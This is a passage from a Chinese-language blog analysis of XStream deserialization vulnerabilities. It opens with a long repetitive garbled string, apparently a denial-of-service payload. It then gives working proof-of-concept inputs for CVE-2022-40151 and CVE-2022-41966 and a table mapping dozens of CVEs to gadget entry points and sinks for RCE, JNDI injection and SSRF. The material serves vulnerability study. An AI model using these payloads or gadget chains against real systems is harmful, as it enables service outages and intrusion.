(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemclL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sch*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sche,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemclL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sch*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sche,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(l*,(d*,(l*,(l*,(l*,(l*,(l*,(l??</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2022-40151"><a href="#CVE-2022-40151" class="headerlink" title="CVE-2022-40151"></a>CVE-2022-40151</h2><h3 id="分析-34"><a href="#分析-34" class="headerlink" title="分析"></a>分析</h3><p>同样也是DOS，当xml标签中存在重复嵌套时会不断递归解析造成堆栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XStream xStream = new XStream();</span><br><span class="line">String xml = new String();</span><br><span class="line">int i = 0;</span><br><span class="line">for( ; i &lt; 10000; ++i) &#123;</span><br><span class="line">    xml += &quot;&lt;set&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">for( ; i &gt; 0; --i) &#123;</span><br><span class="line">    xml += &quot;&lt;/set&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(xml);</span><br><span class="line">xStream.fromXML(xml);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141904321.png" alt="image-20230414190417230"></p>
<h2 id="CVE-2022-41966"><a href="#CVE-2022-41966" class="headerlink" title="CVE-2022-41966"></a>CVE-2022-41966</h2><h3 id="分析-35"><a href="#分析-35" class="headerlink" title="分析"></a>分析</h3><p>原理和CVE-2021-43859相同，也是引用导致重复计算哈希值，导致堆栈异常。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;set&gt;</span><br><span class="line">	&lt;set&gt;</span><br><span class="line">		&lt;string&gt;c&lt;/string&gt;</span><br><span class="line">		&lt;set reference=&#x27;../../../set/set&#x27;/&gt;</span><br><span class="line">	 &lt;/set&gt;</span><br><span class="line">&lt;/set&gt;</span><br></pre></td></tr></table></figure>

<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>终于肝完了，XStream的漏洞是真多，比FastJSON和Shiro都多。多亏后面搞了个白名单，不然又不知道多少RCE。</p>
<p>注：以下的入口点并非真正的入口点，只是方便区分各个漏洞不同的差别点。</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>版本 1.4.19</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2022-41966">CVE-2022-41966</a></td>
<td>若一些集合类型使用了引用，且引用的元素为自身，则会导致堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td><a href="#CVE-2022-40151">CVE-2022-40151</a></td>
<td>当xml标签中存在重复嵌套时会不断递归解析造成堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td><a href="#CVE-2022-40152">CVE-2022-40152</a></td>
<td>当XStream使用了Woodstox组件，且xml中包含许多左括号时，会递归调用该组件的FullDTDReader.java类的readContentSpec方法中，从而发生拒绝服务。</td>
</tr>
<tr>
<td>版本 1.4.18</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-43859">CVE-2021-43859</a></td>
<td>若一些集合类型使用了引用，且引用的元素为自身，则会导致堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td>版本 1.4.17</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-39139">CVE-2021-39139</a></td>
<td>jdk1.7u21下才能使用，AnnotationInvocationHandler的invoke方法作为入口点，它的equalsImpl方法反射执行指定方法，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39140">CVE-2021-39140</a></td>
<td>重复引用造成死循环，导致DOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39141">CVE-2021-39141</a></td>
<td>SEIStub作为入口点，MethodSetter触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39144">CVE-2021-39144</a></td>
<td>NullProvider作为入口点，DTraceProbe触发sink，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39145">CVE-2021-39145</a></td>
<td>Packet作为入口点，LdapBindingEnumeration触发sink，从远程服务器拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39146">CVE-2021-39146</a></td>
<td>MultiUIDefaults作为入口点，ProxyLazyValuec触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39147">CVE-2021-39147</a></td>
<td>Packet作为入口点，LdapSearchEnumeration触发sink，远程拉取工厂类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39148">CVE-2021-39148</a></td>
<td>Packet作为入口点，ContinuationDirContext触发sink，远程拉取工厂类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39149">CVE-2021-39149</a></td>
<td>CompositeInvocationHandlerImpl作为入口点，TemplatesImpl直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39150">CVE-2021-39150</a></td>
<td>SEIStub作为入口点，MethodSetter触发sink，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39151">CVE-2021-39151</a></td>
<td>EventListenerList作为入口点，LdapBindingEnumeration触发sink，从远程服务器拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39152">CVE-2021-39152</a></td>
<td>URLData直接发起URL请求，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39153">CVE-2021-39153</a></td>
<td>PackageWriter作为入口点，TemplatesImpl直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39154">CVE-2021-39154</a></td>
<td>MultiUIDefaults作为入口点，ProxyLazyValue触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td>版本 1.4.16</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-29505">CVE-2021-29505</a></td>
<td>反序列化RemoteObject时，发起JRMP请求，配合存在的其他利用链，可造成RCE。</td>
</tr>
<tr>
<td>版本 1.4.15</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-21341">CVE-2021-21341</a></td>
<td>ObservableList作为入口点，ByteArrayOutputStreamEx死循环，造成DOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21342">CVE-2021-21342</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，URLDataSource直接发起URL查询，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21343">CVE-2021-21343</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，DomainSocketNamedPipe触发sink，造成任意文件删除。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21344">CVE-2021-21344</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，Accessor$GetterSetterReflection触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21345">CVE-2021-21345</a></td>
<td>IndexOrderComparator作为入口点，Accessor$GetterSetterReflection触发sink，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21346">CVE-2021-21346</a></td>
<td>MultiUIDefaults作为入口点，SwingLazyValue触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21347">CVE-2021-21347</a></td>
<td>ObservableList作为入口点，URLClassLoader远程拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21348">CVE-2021-21348</a></td>
<td>ObservableList作为入口点，Scanner中使用嵌套正则匹配字符串，导致ReDOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21349">CVE-2021-21349</a></td>
<td>ObservableList作为入口点，ServiceFinder$ServiceNameIterator直接发起URL连接，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21350">CVE-2021-21350</a></td>
<td>ObservableList作为入口点，触发BCEL ClassLoader加载恶意类并实例化，直接造成RCE。需jdk&lt;8u251。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21351">CVE-2021-21351</a></td>
<td>XRTreeFrag作为入口点，JdbcRowSetImpl发起JNDI查询，造成JNDI注入。</td>
</tr>
<tr>
<td>版本 1.4.14</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2020-26258">CVE-2020-26258</a></td>
<td>NativeString作为入口点，URLDataSource直接发起URL连接，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2020-26259">CVE-2020-26259</a></td>
<td>NativeString作为入口点，ReadAllStream$FileStream直接删除任意文件。</td>
</tr>
<tr>
<td>版本 1.4.13</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2020-26217">CVE-2020-26217</a></td>
<td>NativeString作为入口点，ImageIO$ContainsFilter触发sink，直接RCE。</td>
</tr>
<tr>
<td>版本 1.4.9</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2017-7957">CVE-2017-7957</a></td>
<td>当xml使用void类型时，会造成DOS攻击。</td>
</tr>
<tr>
<td>版本 1.4.8</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2016-3674">CVE-2016-3674</a></td>
<td>DomDriver解析器默认允许外部实体，造成XXE。</td>
</tr>
<tr>
<td>版本 1.4.6（和 1.4.10）</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2013-7285">CVE-2013-7285</a></td>
<td>动态代理配合EventHandler直接RCE。</td>
</tr>
</tbody></table>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://blog.csdn.net/duncan891101/article/details/30973035">XML序列化及PULL解析，DOM解析，SAX解析</a></li>
